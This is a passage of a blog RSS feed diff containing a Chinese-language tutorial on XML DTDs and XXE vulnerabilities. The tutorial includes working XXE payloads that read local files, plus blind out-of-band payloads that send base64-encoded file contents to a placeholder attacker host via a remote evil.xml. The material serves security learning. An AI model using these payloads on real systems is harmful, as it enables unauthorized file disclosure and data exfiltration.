+  &amp;lt;body&amp;gt;Don&#39;t forget me this weekend!&amp;lt;/body&amp;gt;
+&amp;lt;/note&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;DTD元素&#34;&gt;&lt;a href=&#34;#DTD元素&#34; class=&#34;headerlink&#34; title=&#34;DTD元素&#34;&gt;&lt;/a&gt;DTD元素&lt;/h3&gt;&lt;p&gt;在一个 DTD 中，元素通过元素声明来进行声明。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;声明一个元素&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!ELEMENT element-name category&amp;gt;
+或
+&amp;lt;!ELEMENT element-name (element-content)&amp;gt;
+
+；例如
+&amp;lt;!ELEMENT br EMPTY&amp;gt;  表示空元素
+&amp;lt;!ELEMENT element-name (#PCDATA)&amp;gt;  表示只有PCDATA的元素
+&amp;lt;!ELEMENT element-name ANY&amp;gt;        带有任何内容的元素
+&amp;lt;!ELEMENT element-name (child1)&amp;gt; 或  &amp;lt;!ELEMENT element-name (child1,child2,...)&amp;gt;   带有子序列的元素
+等等
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;DTD属性&#34;&gt;&lt;a href=&#34;#DTD属性&#34; class=&#34;headerlink&#34; title=&#34;DTD属性&#34;&gt;&lt;/a&gt;DTD属性&lt;/h3&gt;&lt;p&gt;在 DTD 中，属性通过 ATTLIST 声明来进行声明。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!ATTLIST element-name attribute-name attribute-type attribute-value&amp;gt;
+
+DTD 实例:
+
+&amp;lt;!ATTLIST payment type CDATA &#34;check&#34;&amp;gt;
+
+XML 实例:
+
+&amp;lt;payment type=&#34;check&#34; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;DTD实体&#34;&gt;&lt;a href=&#34;#DTD实体&#34; class=&#34;headerlink&#34; title=&#34;DTD实体&#34;&gt;&lt;/a&gt;DTD实体&lt;/h3&gt;&lt;p&gt;类似于变量的定义，可以使用&lt;code&gt;&amp;amp;name&lt;/code&gt;进行引用&lt;/p&gt;
+&lt;p&gt;实体是用于定义引用普通文本或特殊字符的快捷方式的变量。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;DTD 实例:
+
+&amp;lt;!ENTITY writer &#34;Donald Duck.&#34;&amp;gt;
+&amp;lt;!ENTITY copyright &#34;Copyright runoob.com&#34;&amp;gt;
+
+XML 实例：
+
+&amp;lt;author&amp;gt;&amp;amp;writer;&amp;amp;copyright;&amp;lt;/author&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;XXE漏洞&#34;&gt;&lt;a href=&#34;#XXE漏洞&#34; class=&#34;headerlink&#34; title=&#34;XXE漏洞&#34;&gt;&lt;/a&gt;XXE漏洞&lt;/h2&gt;&lt;h3 id=&#34;有回显&#34;&gt;&lt;a href=&#34;#有回显&#34; class=&#34;headerlink&#34; title=&#34;有回显&#34;&gt;&lt;/a&gt;有回显&lt;/h3&gt;&lt;p&gt;直接将文件地址写出，然后显示即可&lt;/p&gt;
+&lt;p&gt;如&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY file SYSTEM &#34;file:///D://1.txt&#34;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;file;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;无回显&#34;&gt;&lt;a href=&#34;#无回显&#34; class=&#34;headerlink&#34; title=&#34;无回显&#34;&gt;&lt;/a&gt;无回显&lt;/h3&gt;&lt;p&gt;无回显的文件读取可以通过 blind XXE 方法加上外带数据通道（ooB）来提取数据&lt;/p&gt;
+&lt;p&gt;先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器来读取数据。&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&amp;gt;
+&amp;lt;!DOCTYPE test[
+&amp;lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=D:/1.txt&#34;&amp;gt;
+&amp;lt;!ENTITY % dtd SYSTEM &#34;http://xxx.xxx.xxx.xxx/evil.xml&#34;&amp;gt;
+%dtd;
+%send;
+]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;evil.xml&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!ENTITY % payload &#34;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &#39;http://xxx.xxx.xxx.xxx/?content=%file;&#39;&amp;gt;&#34;&amp;gt; %payload;
+//%号要进行实体编码成&amp;amp;#x25
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;监控日志再 base64 解码就是外带出来的数据&lt;/p&gt;
+&lt;p&gt;简单解释一下：其实就是连续调用了 三个参数实体（%dtd，%payload，%file），&lt;/p&gt;
+&lt;p&gt;先 %dtd 请求远程服务器（攻击机）上的 evil.xml，然后 %payload 调用了 %file ，%file 获取对方服务器上的敏感文件，最后替换 %send，数据被发送到我们远程的服务器，就实现了数据的外带&lt;/p&gt;
+&lt;p&gt;两种参考模板&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&amp;gt; 
+&amp;lt;!DOCTYPE data [
+&amp;lt;!ENTITY % file SYSTEM &#34;file:///c://test/1.txt&#34;&amp;gt;
+&amp;lt;!ENTITY % dtd SYSTEM &#34;http://localhost:88/evil.xml&#34;&amp;gt; 
+%dtd; %all; 
+]&amp;gt; 
+&amp;lt;value&amp;gt;&amp;amp;send;&amp;lt;/value&amp;gt;
+
+evil.xml文件内容为
+&amp;lt;!ENTITY % all &#34;&amp;lt;!ENTITY send SYSTEM &#39;http://localhost:88%file;&#39;&amp;gt;&#34;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&amp;gt;
+&amp;lt;!DOCTYPE root [
+&amp;lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=c:/test/1.txt&#34;&amp;gt;
+&amp;lt;!ENTITY % dtd SYSTEM &#34;http://localhost:88/evil.xml&#34;&amp;gt;
+%dtd;
+%send;
+]&amp;gt;
+&amp;lt;root&amp;gt;&amp;lt;/root&amp;gt;
+
+evil.xml文件内容为：
+&amp;lt;!ENTITY % payload &#34;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &#39;http://localhost:88/?content=%file;&#39;&amp;gt;&#34;&amp;gt; %payload;
+&lt;/code&gt;&lt;/pre&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
